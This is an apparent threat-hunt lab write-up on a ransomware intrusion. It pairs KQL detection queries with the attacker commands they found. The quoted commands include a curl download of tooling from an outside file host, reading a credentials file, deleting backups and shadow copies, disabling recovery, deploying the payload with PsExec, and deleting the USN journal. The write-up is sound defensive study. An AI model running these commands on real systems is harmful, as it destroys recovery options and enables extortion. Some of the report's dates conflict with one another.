# 🕵️‍♂️ Threat Hunt Report: Azuki Breach CF
<img width="340" height="510" alt="Azuki" src="https://github.com/user-attachments/assets/990cbaa6-3b4d-45b8-ab67-49646b289572" />


**Analyst:** Edward Campbell  
**Investigation Date:** 7-January-2026  
**Incident Date:** 25-November-2025  

## 🎯 EXECUTIVE SUMMARY

**What Happened:**  

On November 19, 2025, at 18:36UTC, Azuki Import/Export Trading Co. was compromised when an attacker accessed an IT admin VM by using stolen RDP credentials. A week later, the attacker moved laterally to a Linux backup server. They stole credentials, deleted backups, and disabled backup services to eliminate recovery options. They then deployed ransomware across Windows systems, blocked all recovery mechanisms, and left a ransom note on all systems.

---
## 🖥️ INCIDENT DETAILS
### **Timeline Overview**

#### November 25, 2025
- **05:39:10 UTC** — Attacker moved from `10.1.0.108` to the Linux backup server (`10.1.0.189`) via SSH using the `backup-admin` account.

- **05:45:34 UTC** — External tooling was downloaded, backup archives were deleted, and `cron` was stopped and disabled to prevent backups.

- **05:47:02 UTC** — Backup and shadow copy services were stopped, file-locking processes were terminated, all shadow copies were deleted, shadow storage was limited, Windows recovery was disabled, and the backup catalog was removed.

- **05:47:51 UTC** — System discovery was performed, local users and scheduled jobs were enumerated, and stored credentials were accessed.

- **05:58:35 UTC** — `PsExec64.exe` was used to deploy and execute the ransomware payload `silentlynx.exe` on Windows systems.

- **06:05:01 UTC** — Ransom note `SILENTLYNX_README.txt` was dropped.

- **06:07:09 UTC** — Persistence was established via a registry autorun key and a scheduled task.

- **06:10:04 UTC** — The NTFS USN journal was deleted to hinder forensic investigation.




### **Attack Overview**

- **Affected Systems:** azuki-sl, azuki-adminPC, azuki-FS01, azuki-BackupSrv
- **Comprimised Account:** backup-admin
- **Operating Systems:** Windows 11, Linux Ubuntu 22.04
- **Investigation Tool:** Azure Log Analytics Workspace
  
## 🧬 MITRE ATT&CK Mapping (Attack Chain)

| Tactic | Technique ID | Description |
|-------|--------------|-------------|
| **Execution (TA0002)** | T1204.002 | Ransomware payload `silentlynx.exe` was executed on Windows systems. |
| **Persistence (TA0003)** | T1547.001 / T1053.005 | Attacker established persistence using a registry autorun key and a scheduled task. |
| **Defense Evasion (TA0005)** | T1562.001 / T1070.004 | Security processes were terminated and the NTFS USN journal was deleted to hinder investigation. |
| **Discovery (TA0007)** | T1083 / T1087.001 | Backup directories, files, scheduled jobs, and local user accounts were enumerated. |
| **Credential Access (TA0006)** | T1552.001 | Credentials were accessed from unsecured files on the backup server. |
| **Lateral Movement (TA0008)** | T1021.004 / T1021.002 | SSH was used to access the Linux backup server and PsExec was used to move laterally to Windows systems. |
| **Command & Control (TA0011)** | T1105 | External tooling was downloaded to the backup server using `curl`. |
| **Impact (TA0040)** | T1485 / T1489 / T1490 / T1486 | Backups were destroyed, services and recovery features were disabled, systems were encrypted, and a ransom note was dropped. |




---




## :triangular_flag_on_post: Flag 1 - 3 – How was the Backup Server Accessed? 

**Finding**: `ssh.exe backup-admin@10.1.0.189` was ran on `azuki-adminpc` to remote into `Azuki-backupsrv` at `2025-11-25T05:39:10.889728Z`

**Thoughts**: Because I knew the Backup Server was a Linux machine, I wanted to search for SSH connections. I decided to query for commands ran from any machine in the network that included the IP address of the server.

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "10.1.0.189"
```
<img width="921" height="477" alt="image" src="https://github.com/user-attachments/assets/5b8cb663-3840-457b-a5be-0c8442a7fdfd" />



---
## :triangular_flag_on_post: Flag 4 & 5 – How did the attacker find Backup directory contents & backup archives?

**Finding**: the attacker used the `ls --color=auto -la /backups/` command followed by `find /backups -name *.tar.gz` at `2025-11-25T05:47:51.749736Z` 

**Thoughts**:  The `ls` command in Linux is used to list the contents of a directory. I first wanted to see if and where it was used. The `find` command in Linux is used to search for specific files in a directory. I combined it with the string `backups` to see if the attacker tried to find files in a backups directory.

**KQL Queries**:
```
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine has "ls"
```
```
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine has "find"
| where ProcessCommandLine has "backups"
```
<img width="845" height="473" alt="image" src="https://github.com/user-attachments/assets/894ac939-e9a9-49a8-8af1-3f60f02bdf7d" />

---

## :triangular_flag_on_post: Flag 6 – What command enumerated local accounts?

**Finding**:  `cat /etc/passwd` at `2025-11-24T14:16:08.673485Z`

**Thoughts**: Looking at the Mitre technique `T1087.001` (Account Discovery), I found that `/etc/passwd` can be used to enumerate through local users.

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine contains "/etc/passwd"
```
<img width="858" height="493" alt="image" src="https://github.com/user-attachments/assets/b80e88f8-713a-4206-a99e-a43b358150cc" />



---
## :triangular_flag_on_post: Flag 7 – What command revealed scheduled jobs on the system?

**Finding**: `cat /etc/crontab` at `2025-11-24T14:16:08.703052Z`

**Thoughts**: While researching, I discovered that `crontab` is the Linux utility that schedules tasks.

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine contains "crontab"
```
<img width="862" height="405" alt="image" src="https://github.com/user-attachments/assets/07d67caf-580c-4614-b520-8591778a60ff" />

---

## :triangular_flag_on_post: Flag 8 – What command downloaded external tools?

**Finding**: `curl -L -o destroy.7z https[:]//litter[.]catbox[.]moe/io523y[.]7z` at `2025-11-25T05:45:34.259149Z`  

**Thoughts**: the `Curl` command is the easiest method to download contents from a website via CMD

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine contains "curl"
```

<img width="807" height="451" alt="image" src="https://github.com/user-attachments/assets/35f9d851-18a7-492f-8c2b-1cd7c634b917" />


---

## :triangular_flag_on_post: Flag 9 – What command accessed stored credentials?

**Finding**: `cat /backups/configs/all-credentials.txt` at `2025-11-24T14:14:14.217788Z`  

**Thoughts**: text files are the most common unsecured credential files. I first wanted to search for any commands that were used to access a text file.

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine contains ".txt"
```
<img width="881" height="416" alt="image" src="https://github.com/user-attachments/assets/d18004e8-3964-464d-9a2a-ff2fb35bba56" />

---
## :triangular_flag_on_post: Flag 10 - 12 – How did the attacker disable backup services and destroy backup files?

**Finding**: The attacker ran `systemctl stop cron`, `systemctl disable cron`, and  `rm -rf /backups/archives` starting at `2025-11-25T05:47:02.660493Z `  

**Thoughts**: The `systemctl` command is used to manage system services. I paired it with `stop` and `disable` to query for commands ran with all 3. The `rm` command is used to delete files. I used it in combination with `backups` to check if any files had been deleted in the backups directory.

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine contains "systemctl"
| where ProcessCommandLine contains "stop"
```
```
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine contains "systemctl"
| where ProcessCommandLine contains "disable"
```
```
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine contains "rm"
| where ProcessCommandLine contains "backups"
```
<img width="1057" height="411" alt="image" src="https://github.com/user-attachments/assets/f70980b3-a2eb-4a4e-9844-32af0a7887bc" />

---

## :triangular_flag_on_post: Flag 13 & 14 – What tool did the attacker use to execute commands on remote systems?

**Finding**: The attacker ran `PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe` at `2025-11-25T06:03:47.8997504Z`.

**Tool Used**: `PsExec64.exe`


**KQL Query**:
```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where FileName contains "PsExec"
```
<img width="976" height="472" alt="image" src="https://github.com/user-attachments/assets/17c051fc-3455-4da1-b501-1de7b11432c9" />

---
## :triangular_flag_on_post: Flag 15 – What payload was deployed?

**Finding**:  `Silentlynx.exe`

**Note**: This was discovered when running the previous query for flags 13 & 14. 

---
## :triangular_flag_on_post: Flag 16 & 17 – How did the attacker stop the shadow copy service and the backup engine?

**Finding**:  The attacker ran  `"net" stop VSS /y` and `"net" stop wbengine /y` at `2025-11-25T06:04:53.4247108Z`

**Thoughts**: After researching, I found the `.exe` for the `Volume Shadow Copy Service` and the `Backup Engine Service`. I then queried for any commands that included the .exe as well as "stop".


**KQL Query**:
```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where FileName contains "net"
| where ProcessCommandLine contains "stop VSS"
```
```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "WBENGINE"
```
<img width="888" height="487" alt="image" src="https://github.com/user-attachments/assets/3d68cffb-dd1e-4e86-ae2d-744ea010d890" />



## :triangular_flag_on_post: Flag 18 – What command terminated processes to unlock files?

**Finding**: `taskkill /F /IM sqlservr.exe` at `2025-11-25T06:04:57.2122964Z`  

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "taskkill"
```
<img width="970" height="480" alt="image" src="https://github.com/user-attachments/assets/45ef5f68-f92c-4071-9319-6d07cac65599" />

---

## :triangular_flag_on_post: Flag 19 - 22 – How did the attacker inhibit system recovery?

**Finding**: The attacker ran `vssadmin.exe delete shadows /all /quiet` to delete recovery points. Next, they ran `vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB`, which limited the recovery storage size. Finally, they ran `"bcdedit.exe" /set -encodedCommand ZABlAGYAYQB1AGwAdAA= recoveryenabled No `, when Base64 decoded, the command reads `bcdedit /set {default} recoveryenabled No`. This final command disabled system recovery.

**Thoughts**: I discovered `vssadmin.exe`, `bcdedit.exe`, and `wbadmin` all from the Mitre article on ID: T1490 (Inhibit System Recovery).

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "vssadmin.exe"
```
```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "bcdedit.exe"
```
```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "wbadmin"
```
<img width="905" height="446" alt="image" src="https://github.com/user-attachments/assets/ccddea8a-6c34-4d62-a8a9-b6ffbc59374d" />

---
## :triangular_flag_on_post: Flag 23 & 24 – How did the attacker establish persistence? 

**Finding**: The attacker created a registry autorun entry under the name `WindowsSecurityHealth` which points to the malicious executable `silentlynx.exe`. Then created a scheduled task `Microsoft\Windows\Security\SecurityHealthService` at `2025-11-25T06:07:09.8191737Z`

**Registry Key**: `HKEY_CURRENT_USER\S-1-5-21-3215208035-517803886-2772267501-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`  

**Thoughts**: Looking at Mitre ID: T1547.001 (Boot or Logon Autostart Execution), I discovered that `HKEY_C_U\Software\...\CurrentVersion\Run` and `HKEY_L_M\Software\...\CurrentVersion\Run` are default Windows run keys. I wanted to query for any registry edits that included `CurrentVersion\Run`. Next, I queried for any commands ran that included `schtasks`.

**KQL Query**:
```
DeviceRegistryEvents
| where DeviceName contains "azuki"
| where RegistryKey contains "CurrentVersion"
| where RegistryKey contains "Run"
```
```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "schtasks"
```
<img width="1037" height="420" alt="image" src="https://github.com/user-attachments/assets/6721d9b2-a613-45fe-9460-9300c615d5e7" />

---  

## :triangular_flag_on_post: Flag 25 – What command deleted forensic evidence?

**Finding**: ` "fsutil.exe" usn deletejournal /D C:`  `at 2025-11-25T06:10:04.9141148Z`

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "delete"
```
<img width="880" height="477" alt="image" src="https://github.com/user-attachments/assets/b0748948-dca4-4424-903d-1e6ad96e30ab" />


---

## :triangular_flag_on_post: Flag 26 – What is the ransom note filename?

**Finding**: SILENTLYNX_README.txt

**Thoughts**: On the ransom note, it is written that the report is from the `SilentLynx` team and that the file extension is `.lynx`. I decided to query for any files with "lynx". I figured this would show any files that had either SILENTLYNX as the name or had the .lynx file extension.


**KQL Query**:
```
DeviceFileEvents
| where DeviceName contains "azuki"
| where FileName contains "lynx"
```
<img width="1042" height="496" alt="image" src="https://github.com/user-attachments/assets/8011137a-369e-4533-9ab3-1dd52538be71" />

---

## **APPENDIX**

### **Key Indicators of Compromise (IOCs)**

---

### 🔹 **File Hashes**
| File | SHA256 |
|------|--------|
| **SILENTLYNX_README.txt** | `ba9ee9747a60b34e6099ceb2f51a95b748a4f34d2114b5171756e8ae55f688ec` |
| **silentlynx.exe** | `edfae1a69522f87b12c6dac3225d930e4848832e3c551ee1e7d31736bf4525ef` |
| **PsExec64.exe** | `0ff6f2c94bc7e2833a5f7e16de1622e5dba70396f31c7d5f56381870317e8c46` |
| **destroy.7z** | `aca992dba6da014cd5baaa739624e68362c8930337f3a547114afdbd708d06a4` |

### 🔹 **Ip addresses**
| System | IP |
|------|----------|
| 1st connection to Backup sever  | **10.1.0.108** |
| Backup sever  | **10.1.0.189** |
| Windows Target  | **10.1.0.102** |

### 🔹 **Ransom Note**

<img width="505" height="593" alt="note" src="https://github.com/user-attachments/assets/23de8a0b-b05b-42a4-96c8-2afd29426910" />

---

**Report Completed By:** Edward Campbell

**Date:** 7 January 2025
